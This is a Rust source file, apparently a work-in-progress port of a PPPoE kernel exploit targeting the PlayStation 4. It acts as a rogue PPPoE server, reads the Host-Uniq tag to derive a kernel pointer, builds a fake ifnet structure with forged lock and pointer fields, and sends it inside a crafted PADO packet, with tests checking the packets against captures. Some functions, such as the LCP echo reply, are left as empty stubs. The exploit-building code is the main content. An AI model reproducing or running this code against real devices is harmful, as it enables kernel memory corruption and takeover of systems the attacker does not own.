extern crate pnet;
use crate::constants;
use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread::{self, JoinHandle};
use std::time::Duration;

pub struct LcpEchoHandler {
    interface: NetworkInterface,
    running: Arc<AtomicBool>,
    thread_handle: Option<JoinHandle<()>>,
}

impl LcpEchoHandler {
    pub fn new(interface: NetworkInterface) -> Self {
        Self {
            interface,
            running: Arc::new(AtomicBool::new(false)),
            thread_handle: None,
        }
    }

    pub fn start(&mut self) {
        println!("[*] Starting LCP Echo Handler...");
        let running = Arc::new(AtomicBool::new(true));
        self.running = Arc::clone(&running);
        let interface = self.interface.clone();

        // Open channel
        let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };

        // Pass channel to the thread and run
        let running_in_thread = Arc::clone(&running);
        let handle = thread::spawn(move || {
            while running_in_thread.load(Ordering::Relaxed) {
                LcpEchoHandler::echo_handler(tx.as_mut(), rx.as_mut());
            }
            println!("Thread has stopped.");
        });

        self.thread_handle = Some(handle);
    }

    pub fn stop(&mut self) {
        // Stop the thread
        self.running.store(false, Ordering::Relaxed);
        // Join the thread if it is running
        if let Some(handle) = self.thread_handle.take() {
            handle.join().unwrap();
        }
    }

    fn echo_handler(tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) {
        println!("[*] Starting loop for LCP Echo Request...");
        loop {
            match rx.next() {
                Ok(packet) => {
                    // If it is an LCP echo request, send a reply
                    if is_lcp_echo_request(&packet) {
                        println!("[*] Found LCP Echo Request...");
                        Self::send_echo_reply(tx, &packet);
                    }
                }
                Err(e) => {
                    panic!("An error occurred while reading a packet: {}", e);
                }
            }
        }
    }

    fn send_echo_reply(tx: &mut dyn DataLinkSender, request: &[u8]) {
        // Get the data from the request
        // Build the LCP reply
        // Use it to send the response
    }
}

pub struct Exploit {
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub source_mac: [u8; 6],
    pub host_uniq: [u8; 8],
}

impl Exploit {
    pub fn calc_planted(&mut self) {
        let planted = (self.pppoe_softc + 0x07) & 0xffffffffffff;
        let planted_bytes = planted.to_be_bytes();
        // Take the first 6 bytes of the 8-byte array and convert them to a fixed-size array
        let truncated_bytes: [u8; 6] = planted_bytes[2..8]
            .try_into()
            .expect("slice with incorrect length");
        self.source_mac = truncated_bytes;
        println!("[+] Source MAC: {:?}", self.source_mac);
    }

    pub fn ppp_negotiation(&mut self, interface: NetworkInterface) {
        println!("[*] Starting PPP Negotiation...");
        let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };

        let padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        self.handle_padi(&padi.unwrap());
        let pado = create_pado_packet(
            self.source_mac,
            self.target_mac,
            build_fake_ifnet(self.pppoe_softc),
            self.host_uniq,
        );
        let result = tx
            .send_to(&pado, None)
            .expect("[-] Failed to send PADO packet");
        let padr = listen_for_packet(rx.as_mut(), is_padr_packet);
        println!("[+] PADR Packet received");
        // Send PADS
        println!("[+] Sending PADS");
        let pads = create_pads_packet(
            self.source_mac,
            self.target_mac,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            self.host_uniq,
        );
        let result = tx
            .send_to(&pads, None)
            .expect("[-] Failed to send PADS packet");
        println!("[+] PPP Negotiation Success!");
    }

    pub fn handle_padi(&mut self, data: &[u8]) {
        println!("[+] PADI packet received");
        // Extracting Host Unique Tag and populating the self.pppoe_softc
        self.host_uniq = extract_host_uniq(&data).unwrap();
        self.pppoe_softc = u64::from_be_bytes(self.host_uniq);
        // Extract and update source mac
        self.target_mac = extract_ps4_source_mac(&data).unwrap();
        println!("[+] Exploit Target MAC: {:?}", self.target_mac);
        self.calc_planted();
        let ac_cookie = build_fake_ifnet(self.pppoe_softc);
        println!("[+] AC cookie length: {:?}", ac_cookie.len());
    }
}

fn is_padi_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADI (0x09)
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADI
}

fn is_padr_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADR
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADR
}

fn is_lcp_echo_request(data: &[u8]) -> bool {
    // Check if packet length is sufficient for LCP echo request
    // 6 + 6 + 2 + 4 = PPP for sure
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for LCP (0xc021)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOESESS {
        return false;
    }

    // Check PPPoE code field
    let pppoe_code = u8::from_be_bytes([data[22]]);
    pppoe_code == constants::PPPOE_CODE_LCP_ECHO_REQ
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ {
            if offset + tag_len <= data.len() {
                // Extract the Host-Uniq tag value
                let host_uniq = &data[offset..offset + tag_len];
                if tag_len == 8 {
                    // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                    result.copy_from_slice(host_uniq);
                    println!("[+] Extracted Host-Uniq: {:?}", result);
                    break;
                }
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_source_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];

    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);

    Ok(mac_address)
}

pub fn build_fake_ifnet(pppoe_softc: u64) -> Vec<u8> {
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                  // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

pub fn create_lcp_echo_reply(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Vec<u8>,
    session_id: [u8; 2],
    identifier: u8,
) -> Vec<u8> {
    let mut packet = Vec::new();
    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOESESS.to_be_bytes());

    packet
}

pub fn create_pado_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Vec<u8>,
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOEDISC.to_be_bytes());

    // PPPoE header
    packet.push(0x11); // Version (1) and Type (1)
    packet.push(constants::PPPOE_CODE_PADO); // Code (PADO)
    packet.extend_from_slice(&0u16.to_be_bytes()); // Session ID (not used in PADO)

    // Placeholder for Payload Length (2 bytes), will be set later
    let payload_length_pos = packet.len();
    packet.extend_from_slice(&[0, 0]);

    // PPPoE Tag for ACOOKIE
    packet.extend_from_slice(&constants::PPPOE_TAG_ACOOKIE.to_be_bytes());
    packet.extend_from_slice(&(ac_cookie.len() as u16).to_be_bytes());
    packet.extend_from_slice(&ac_cookie);

    // PPPoE Tag for HUNIQUE
    packet.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    packet.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    packet.extend_from_slice(&host_uniq);

    // Set the Payload Length
    let payload_length = packet.len() - payload_length_pos - 2;
    packet[payload_length_pos..payload_length_pos + 2]
        .copy_from_slice(&(payload_length as u16).to_be_bytes());

    packet
}

pub fn create_pads_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOEDISC.to_be_bytes());

    // PPPoE header
    packet.push(0x11); // Version (1) and Type (1)
    packet.push(constants::PPPOE_CODE_PADS); // Code (PADS)
    packet.extend_from_slice(&session_id); // Session ID

    // We know fixed size of 12
    packet.extend_from_slice(&[0, 12]);

    // PPPoE Tag for HUNIQUE
    packet.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    packet.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    packet.extend_from_slice(&host_uniq);

    packet
}

fn listen_for_packet<F>(rx: &mut dyn DataLinkReceiver, predicate: F) -> Option<Vec<u8>>
where
    F: Fn(&[u8]) -> bool,
{
    loop {
        match rx.next() {
            Ok(packet) => {
                if predicate(&packet) {
                    // Get the raw packet data as a slice
                    return Some(packet.to_vec());
                }
            }
            Err(e) => {
                panic!("An error occurred while reading a packet: {}", e);
            }
        }
    }
}

mod tests {
    use super::*;
    use pcap::{Activated, Active, Capture, Inactive, State};
    use pcap::{Offline, Packet};

    #[test]
    fn test_is_padi_packet_from_file() {
        // Open the pcap file
        let mut cap =
            Capture::from_file("initial_two_padi.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                println!("Found a PADI packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that 2 PADI packet were found
        assert_eq!(count, 2);
    }
    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap =
            Capture::from_file("initial_two_padi.pcap").expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap =
            Capture::from_file("initial_two_padi.pcap").expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_source_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let pppoe_softc: u64 = 0x123456789ABCDEF0;
        let rust_fake_ifnet = build_fake_ifnet(pppoe_softc);

        // Dump the fake ifnet to a file
        let mut rust_file = File::create("rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_pado_packet() {
        // Open the pcap file containing the expected PADO packet
        let mut cap = Capture::from_file("pado_to_ps4.pcap").expect("Failed to open pcap file");

        // Extract the PADO packet from the file
        let expected_packet = cap.next_packet().expect("Failed to read PADO packet");

        // Define the input parameters for creating the PADO packet
        let source_mac = [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b];
        let target_mac = [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97];
        let ifnet = build_fake_ifnet(0xffff9bba06f62c00);
        let ac_cookie = ifnet;
        let host_uniq = [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff];

        // Create the PADO packet using the provided function
        let generated_pado_packet =
            create_pado_packet(source_mac, target_mac, ac_cookie, host_uniq);

        // Write the generated PADO packet to a binary file
        let mut generated_file =
            File::create("generated_pado.bin").expect("Failed to create binary file");
        generated_file
            .write_all(&generated_pado_packet)
            .expect("Failed to write packet to binary file");

        // Write the expected PADO packet to a binary file
        let mut expected_file =
            File::create("expected_pado.bin").expect("Failed to create binary file");
        expected_file
            .write_all(&expected_packet.data)
            .expect("Failed to write packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected_packet.data.len(),
            generated_pado_packet.len(),
            "Packet lengths are not equal"
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in expected_packet
            .data
            .iter()
            .zip(generated_pado_packet.iter())
            .enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {}: expected {:02x}, got {:02x}",
                idx, expected_byte, generated_byte
            );
        }
    }

    #[test]
    fn test_pads_packet() {
        let mut cap = Capture::from_file("pads_to_ps4.pcap").expect("Failed to open pcap file");

        let expected_packet = cap.next_packet().expect("Failed to read PADS packet");

        // Define the input parameters for creating the PADS packet
        let source_mac = [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b];
        let target_mac = [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97];
        let session_id: [u8; 2] = 0xffff_u16.to_be_bytes();
        let host_uniq = [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff];

        let generated_pads_packet =
            create_pads_packet(source_mac, target_mac, session_id, host_uniq);

        let mut generated_file =
            File::create("generated_pads.bin").expect("Failed to create binary file");
        generated_file
            .write_all(&generated_pads_packet)
            .expect("Failed to write packet to binary file");

        // Write the expected PADS packet to a binary file
        let mut expected_file =
            File::create("expected_pads.bin").expect("Failed to create binary file");
        expected_file
            .write_all(&expected_packet.data)
            .expect("Failed to write packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected_packet.data.len(),
            generated_pads_packet.len(),
            "Packet lengths are not equal"
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in expected_packet
            .data
            .iter()
            .zip(generated_pads_packet.iter())
            .enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {}: expected {:02x}, got {:02x}",
                idx, expected_byte, generated_byte
            );
        }
    }
}
